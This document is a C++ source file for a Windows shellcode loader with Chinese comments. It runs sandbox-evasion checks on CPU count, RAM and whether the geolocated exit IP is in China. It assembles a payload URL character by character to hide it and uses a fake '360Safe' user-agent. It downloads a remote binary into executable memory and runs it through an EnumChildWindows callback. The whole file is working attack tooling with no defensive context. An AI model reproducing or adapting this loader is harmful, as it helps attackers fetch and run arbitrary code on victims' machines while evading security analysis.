#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include "lazy_importer.hpp"
#include <locale.h> 
#pragma comment(lib, "wininet.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )



int check_cpu_mem() {
    SYSTEM_INFO   SysInfo = { 0 };
    GetSystemInfo(&SysInfo);
    DWORD CPU_INFO = SysInfo.dwNumberOfProcessors;

    MEMORYSTATUSEX mem;

    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);

    int ram = (float)mem.ullTotalPhys / 1073741824;

    if (CPU_INFO > 4 && ram > 5) {
        Sleep(1);
        return 1;
    }
    else {
        exit(0);
    }
}
int check_ip() {
    //检测出口IP
    setlocale(LC_ALL, "en_US.UTF-8");  
    FILE* fp;
    char current_ip[100];
    char command[] = "curl -s -H \"Accept-Charset: utf-8\" https://myip.ipip.net/";
 
    fp = _popen(command, "r");
    if (fp == NULL) {
        exit(1);
    }

    fgets(current_ip, sizeof(current_ip), fp);
    fclose(fp);
 
    current_ip[strcspn(current_ip, "\n")] = 0;


    wchar_t wcurrent_ip[100];
    mbstowcs(wcurrent_ip, current_ip, 100);

    if (wcsstr(wcurrent_ip, L"\u4e2d\u56fd") != NULL) {
        Sleep(1);
        return 1;
    }
    else {
        exit(0);
    }
}
void* mymemcpy(void* dest, const void* src, size_t n)
{
    if (dest == NULL || src == NULL)
        return NULL;
    char* pDest = static_cast <char*>(dest);
    const char* pSrc = static_cast <const char*>(src);
    if (pDest > pSrc && pDest < pSrc + n)
    {
        for (size_t i = n - 1; i != -1; --i)
        {
            pDest[i] = pSrc[i];
        }
    }
    else
    {
        for (size_t i = 0; i < n; i++)
        {
            pDest[i] = pSrc[i];
        }
    }

    return dest;
}
void ExecuteShellcodeFromURL(const char* url) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[4096];
    size_t totalBytesRead = 0;  // 用于累计读取的总字节数


    wchar_t wideUrl[512];
    size_t convertedChars = 0;
    errno_t err = mbstowcs_s(&convertedChars, wideUrl, sizeof(wideUrl) / sizeof(wchar_t), url, _TRUNCATE);
    if (err != 0) {
        return;
    }

    // 初始化 Internet 会话
    hInternet = InternetOpenW(L"360Safe", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return;
    }

    // 连接到 URL
    hConnect = InternetOpenUrlW(hInternet, wideUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        ;       InternetCloseHandle(hInternet);
        return;
    }

    // 先读取数据，计算总字节数
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
    }

    // 重新设置连接，以便重新读取数据
    InternetCloseHandle(hConnect); // 关闭先前的连接
    hConnect = (InternetOpenUrlW)(hInternet, wideUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);


    // 根据实际读取的字节数分配内存
    LPVOID pl = LI_FN(VirtualAlloc)(nullptr, totalBytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    // 下载并写入数据到内存
    char* currentBuffer = (char*)pl;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        mymemcpy(currentBuffer, buffer, bytesRead);  
        currentBuffer += bytesRead;               
    }



    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    EnumChildWindows(NULL, (WNDENUMPROC)pl, NULL);



}
void BuildURL(char* url) {
    const char* parts[] = {
        "h", "t", "t", "p", ":", "/", "/", "1", "9", "2", ".", "1", "6", "8", ".", "1", ".", "3", "/", "1", ".", "b", "i", "n"
    };
    size_t url_len = 0;
    for (int i = 0; i < sizeof(parts) / sizeof(parts[0]); i++) {
        url_len += strlen(parts[i]);
    }

  
    url_len++;  
    url[url_len - 1] = '\0'; 
    char* currentPos = url;

    for (int i = 0; i < sizeof(parts) / sizeof(parts[0]); i++) {
        strcpy(currentPos, parts[i]);  
        currentPos += strlen(parts[i]);  
    }
}

int main() {

    char Dest[512];
    const char* url = "https://127.0.0.1/temp/share/ascTemSile.bak";
    check_cpu_mem();
    check_ip();
    BuildURL(Dest);
    ExecuteShellcodeFromURL(url);
    ExecuteShellcodeFromURL(Dest); 
}
